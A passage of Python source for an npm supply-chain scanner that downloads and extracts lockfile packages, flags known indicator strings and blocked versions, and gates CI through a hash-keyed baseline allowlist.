# treated like .js (attackers use whichever the loader resolves).
_TEXT_SUFFIXES = (
    ".js",
    ".mjs",
    ".cjs",
    ".ts",
    ".tsx",
    ".json",
    ".html",
    ".htm",
    ".sh",
    ".bash",
    ".zsh",
    ".py",
    ".rb",
    ".yml",
    ".yaml",
)


def scan_extracted_tree(pkg: PackageEntry, root: Path) -> list[Finding]:
    findings: list[Finding] = []
    for path in sorted(root.rglob("*")):
        if not path.is_file():
            continue
        rel = path.relative_to(root).as_posix()
        lower = rel.lower()
        if not lower.endswith(_TEXT_SUFFIXES):
            # Skip native binaries (regex over machine code is noise);
            # content-magic detection also skips extensionless
            # executables and versioned shared libraries.
            try:
                if path.stat().st_size > HARD_MAX_TEXT_FILE_BYTES:
                    continue
                with open(path, "rb") as fh:
                    header = fh.read(16)
                if _looks_binary(rel, header):
                    continue
                data = header + path.read_bytes()[len(header) :]
            except OSError:
                continue
            text = data.decode("utf-8", errors = "replace")
            for needle, (sev, why) in KNOWN_IOC_STRINGS.items():
                if needle in text:
                    findings.append(
                        Finding(
                            severity = sev,
                            package = pkg.display,
                            filename = rel,
                            pattern = "known-ioc-string",
                            evidence = _ioc_evidence(text, needle),
                            detail = f"{why}: {needle!r}",
                        )
                    )
            continue
        try:
            data = path.read_bytes()
        except OSError:
            continue
        text = data.decode("utf-8", errors = "replace")
        if rel.endswith("package.json"):
            findings.extend(scan_package_json(pkg, rel, text))
        findings.extend(scan_text_blob(pkg, rel, text))
    return findings


# ─────────────────────────────────────────────────────────────────────
# Orchestrator.
# ─────────────────────────────────────────────────────────────────────


def scan_one(pkg: PackageEntry, workspace: Path) -> tuple[list[Finding], str | None]:
    """Download + extract + scan a single package; cleans up its dir.

    Returns (findings, error). `error` is non-None only on hard
    failures (download, integrity mismatch, malformed tarball); on a
    clean run with findings, error is None and the caller decides the
    exit code from severity.
    """
    pkg_dir = workspace / f"{pkg.name.replace('/', '_')}-{pkg.version}"
    pkg_dir.mkdir(parents = True, exist_ok = True)
    tarball = pkg_dir / "pkg.tgz"
    extract = pkg_dir / "x"
    try:
        _, err = download_tarball(pkg, tarball)
        if err:
            return [], err
        err = safe_extract(tarball, extract)
        if err:
            return [], err
        return scan_extracted_tree(pkg, extract), None
    finally:
        # Always wipe per-package data to keep the workspace bounded.
        try:
            shutil.rmtree(pkg_dir, ignore_errors = True)
        except Exception:
            pass


# ─────────────────────────────────────────────────────────────────────
# Baseline allowlist: triaged known-good HIGH/CRITICAL findings so the gate
# can enforce without red-failing on rare legitimate-library behavior.
# Matched on ``(normalized package, package-relative path, pattern)`` -- not
# evidence text -- so a version bump does not reopen a finding, but a *new*
# kind of finding in a listed file is a different pattern and still fails.
# Mirrors scan_packages.py. Regenerate with ``--write-baseline``.
# ─────────────────────────────────────────────────────────────────────

_DEFAULT_BASELINE_PATH = str(Path(__file__).resolve().parent / "scan_npm_packages_baseline.json")

# Bumped when the entry-key semantics change. v3 adds an evidence hash so a new
# payload under an already-listed package/path/pattern is not auto-suppressed; v2
# keyed on the package-relative path; v1 stored only a basename. A pre-v3 baseline
# with entries is ignored (fail closed) rather than mis-applied.
_BASELINE_SCHEMA_VERSION = 3


def _norm_pkg_name(display: str) -> str:
    """``@scope/pkg@1.2.3`` / ``pkg@1.2.3`` -> name without the version.

    The version is the LAST ``@``-separated field; a leading ``@`` (scope)
    is preserved. Lower-cased (npm names are case-insensitive). Sentinels
    like ``<root>`` / ``<lockfile>`` pass through unchanged.
    """
    s = (display or "").strip()
    at = s.rfind("@")
    if at > 0:  # >0 so a leading @scope is not treated as the version sep
        s = s[:at]
    return s.lower()


_NPM_TARBALL_ROOT = "package/"


def _relpath_in_package(filename: str) -> str:
    """Path within the published package, stable across version bumps. npm
    tarballs root every file at ``package/``; strip it so the key is the real
    source path (``dist/index.js``) and a new file with the same basename in a
    different directory is not silently suppressed."""
    f = (filename or "").replace("\\", "/")
    return f[len(_NPM_TARBALL_ROOT) :] if f.startswith(_NPM_TARBALL_ROOT) else f


def _evidence_hash(evidence: str) -> str:
    """Stable digest of the matched evidence. The npm snippet carries no line
    markers, so it is already version-stable; whitespace outside string literals is
    collapsed (reindent-stable) while whitespace inside literals is preserved, so a
    changed payload body reopens but a formatter reindent does not."""
    canon = _canon_preserve_strings(evidence or "")
    return hashlib.sha256(canon.encode("utf-8", "replace")).hexdigest()


def _finding_key(f: Finding) -> tuple[str, str, str, str]:
    """Allowlist key: normalized package, package-relative path, pattern, and a
    hash of the matched evidence -- so changed flagged code under an already-listed
    package/path/pattern reopens instead of riding the reviewed entry."""
    return (
        _norm_pkg_name(f.package),
        _relpath_in_package(f.filename),
        f.pattern,
        _evidence_hash(f.evidence or f.detail),
    )


def _load_baseline(path: str) -> set[tuple[str, str, str, str]]:
    """Load an allowlist JSON into a set of match keys. Missing file -> empty."""
    try:
        with open(path, "r", encoding = "utf-8") as fh:
            data = json.load(fh)
    except FileNotFoundError:
        return set()
    except (OSError, json.JSONDecodeError) as exc:
        print(f"  [WARN] could not read baseline {path}: {exc}", file = sys.stderr)
        return set()
    if not isinstance(data, dict):
        print(f"  [WARN] baseline {path} is not a JSON object", file = sys.stderr)
        return set()
    entries = data.get("entries", [])
    if not isinstance(entries, list):
        print(f"  [WARN] baseline {path} entries is not a list", file = sys.stderr)
        return set()
    # v2 shares v3's package-relative keying, so its entries migrate by recomputing
    # the evidence hash from their stored evidence; only pre-v2 (basename) is rejected.
    if entries and data.get("version") not in (_BASELINE_SCHEMA_VERSION, 2):
        print(
            f"  [WARN] baseline schema v{data.get('version')} predates package-relative "
            f"keys; ignoring {len(entries)} entr(y/ies). Regenerate with --write-baseline.",
            file = sys.stderr,
        )
        return set()
    keys: set[tuple[str, str, str, str]] = set()
    legacy = 0
    for e in entries:
        if not isinstance(e, dict):
            continue
        try:
            evidence_hash = e.get("evidence_hash") or _evidence_hash(e.get("evidence") or "")
            if not e.get("evidence_hash"):
                legacy += 1
            keys.add(
                (
                    _norm_pkg_name(e["package"]),
                    _relpath_in_package(e["file"]),
                    e["pattern"],
                    evidence_hash,
                )
            )
        except (KeyError, TypeError):
            continue
    if legacy:
        print(
            f"  [WARN] baseline {path}: {legacy} entries lack evidence_hash and may "
            f"not suppress until regenerated with --write-baseline (findings reopen "
            f"rather than risk hiding changed code under a coarse key)",
            file = sys.stderr,
        )
    return keys


def _write_baseline(path: str, findings: list[Finding], threshold_rank: int) -> int:
    """Persist at-or-above-threshold findings as an allowlist for triage."""
    entries = []
    seen: set[tuple[str, str, str, str]] = set()
    for f in sorted(findings, key = lambda f: (_SEVERITY_RANK[f.severity], f.package)):
        if _SEVERITY_RANK[f.severity] > threshold_rank:
            continue
        key = _finding_key(f)
        if key in seen:
            continue
        seen.add(key)
        evidence = f.evidence or f.detail
        entries.append(
            {
                "package": _norm_pkg_name(f.package),
                "file": _relpath_in_package(f.filename),
                "pattern": f.pattern,
                "severity": f.severity,
                "evidence": evidence,
                "evidence_hash": _evidence_hash(evidence),
            }
        )
    doc = {
        "_comment": (
            "scan_npm_packages.py allowlist. Each entry is a HIGH/CRITICAL "
            "finding manually judged benign. Matched on (package, "
            "package-relative path, pattern, evidence hash); a new payload under "
            "an already-listed package/path/pattern reopens. severity is for "
            "review only. Regenerate with --write-baseline AFTER reviewing every line."
        ),
        "version": _BASELINE_SCHEMA_VERSION,
        "entries": entries,
    }
    with open(path, "w", encoding = "utf-8") as fh:
        json.dump(doc, fh, indent = 2, sort_keys = False)
        fh.write("\n")
    print(f"  Wrote {len(entries)} baseline entr(y/ies) to {path}")
    return len(entries)


def _partition_baseline(
    findings: list[Finding], baseline: set[tuple[str, str, str, str]]
) -> tuple[list[Finding], list[Finding]]:
    """Split findings into (active, suppressed) by allowlist membership."""
    if not baseline:
        return list(findings), []
    active, suppressed = [], []
    for f in findings:
        (suppressed if _finding_key(f) in baseline else active).append(f)
    return active, suppressed


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description = "Pre-install npm tarball content scanner.",
    )
    parser.add_argument(
        "--lockfile",
        default = str(REPO_ROOT / "studio" / "frontend" / "package-lock.json"),
        help = "Path to package-lock.json (default: studio/frontend).",
    )
    parser.add_argument(
        "--max-packages",
        type = int,
        default = 0,
        help = (
            "Cap on number of packages to scan (0 = no cap). Useful "
            "for local triage; CI runs with 0."
        ),
    )
    parser.add_argument(
        "--fail-on",
        choices = ("info", "medium", "high", "critical"),
        default = "high",
        help = (
            "Lowest severity that fails the run (default: high). "
            "Medium and below print but exit 0."
        ),
    )
    parser.add_argument(
        "--baseline",
        metavar = "FILE",
        default = None,
        help = (
            "Allowlist JSON of triaged known-good findings to suppress. "
            "Defaults to scan_npm_packages_baseline.json next to this script "
            "if present."
        ),
    )
    parser.add_argument(
        "--no-baseline",
        action = "store_true",
        help = "Ignore the auto-discovered baseline allowlist.",
    )
    parser.add_argument(
        "--write-baseline",
        metavar = "FILE",
        default = None,
        help = (
            "Write the current at/above-threshold findings to FILE as an "
            "allowlist, then exit 0. Review every entry before committing it."
        ),
    )
    args = parser.parse_args(argv)

    lockfile = Path(args.lockfile).resolve()
    if not lockfile.exists():
        print(f"[scan-npm] lockfile not found: {lockfile}", file = sys.stderr)
        return 2

    entries, struct_findings = parse_lockfile(lockfile)
    if struct_findings:
        print(
            f"[scan-npm] {len(struct_findings)} structural finding(s) "
            "from lockfile pass; subsequent download scan skipped for "
            "those entries.",
            flush = True,
        )

    if args.max_packages > 0:
        entries = entries[: args.max_packages]

    workspace = Path(tempfile.mkdtemp(prefix = "npm-scan-")).resolve()
    atexit.register(lambda: shutil.rmtree(workspace, ignore_errors = True))
    print(
        f"[scan-npm] workspace: {workspace}\n"
        f"[scan-npm] scanning {len(entries)} package(s) from {lockfile}",
        flush = True,
    )

    all_findings: list[Finding] = list(struct_findings)
    hard_errors: list[tuple[str, str]] = []

    for i, pkg in enumerate(entries, start = 1):
        print(
            f"[scan-npm] [{i}/{len(entries)}] {pkg.display}",
            flush = True,
        )
        blocked = BLOCKED_NPM_VERSIONS.get(pkg.name, set())
        if pkg.version in blocked:
            finding = Finding(
                severity = CRITICAL,
                package = pkg.display,
                filename = "<lockfile>",
                pattern = "blocked-known-malicious",
                detail = f"{pkg.name}@{pkg.version} is on the BLOCKED_NPM_VERSIONS list",
            )
            all_findings.append(finding)
            print(str(finding), flush = True)
            continue
        findings, err = scan_one(pkg, workspace)
        if err:
            hard_errors.append((pkg.display, err))
            print(f"[scan-npm]   ERROR {pkg.display}: {err}", flush = True)
            continue
        all_findings.extend(findings)
        for f in findings:
            print(str(f), flush = True)

    # Sort by severity then package.
    all_findings.sort(key = lambda f: (_SEVERITY_RANK[f.severity], f.package))

    print(
        f"\n[scan-npm] summary: {len(entries)} package(s), "
        f"{len(all_findings)} finding(s), "
        f"{len(hard_errors)} hard error(s)",
        flush = True,
    )

    if hard_errors:
        print("\n[scan-npm] HARD ERRORS:", file = sys.stderr)
        for pkg, err in hard_errors:
            print(f"  {pkg}: {err}", file = sys.stderr)

    threshold = {
        "info": INFO,
        "medium": MEDIUM,
        "high": HIGH,
        "critical": CRITICAL,
    }[args.fail_on]
    threshold_rank = _SEVERITY_RANK[threshold]

    # --write-baseline: persist the full current at/above-threshold set as the
    # new allowlist (ignoring any loaded baseline), then exit 0. A hard error
    # means the scan was incomplete, so warn -- a baseline baked from a partial
    # run would silently allow whatever failed to download.
    if args.write_baseline:
        if hard_errors:
            print(
                f"  [WARN] {len(hard_errors)} hard error(s): baseline may be "
                "incomplete (some packages did not scan).",
                file = sys.stderr,
            )
        _write_baseline(args.write_baseline, all_findings, threshold_rank)
        return 0

    # Baseline allowlist: suppress triaged, known-good findings so the CI gate
    # can be enforcing without red-failing on legitimate-library noise.
    if args.no_baseline:
        baseline_path = None
    elif args.baseline:
        baseline_path = args.baseline
    elif os.path.isfile(_DEFAULT_BASELINE_PATH):
        baseline_path = _DEFAULT_BASELINE_PATH
    else:
        baseline_path = None
    baseline = _load_baseline(baseline_path) if baseline_path else set()
    active, suppressed = _partition_baseline(all_findings, baseline)

    if suppressed:
        crit_s = sum(1 for f in suppressed if f.severity == CRITICAL)
        high_s = sum(1 for f in suppressed if f.severity == HIGH)
        print(
            f"\n[scan-npm] {len(suppressed)} finding(s) suppressed by baseline "
            f"{baseline_path} ({crit_s} CRITICAL, {high_s} HIGH).",
            flush = True,
        )

    # Exit code: 1 on a hard error, or a NON-baselined finding at/above the
    # threshold. This is the signal CI gates on once the baseline is clean.
    blocking = [f for f in active if _SEVERITY_RANK[f.severity] <= threshold_rank]
    if hard_errors or blocking:
        if blocking:
            print(
                f"\n[scan-npm] FAIL: {len(blocking)} finding(s) " f"at or above {threshold}",
                file = sys.stderr,
            )
        return 1
    print("\n[scan-npm] OK", flush = True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
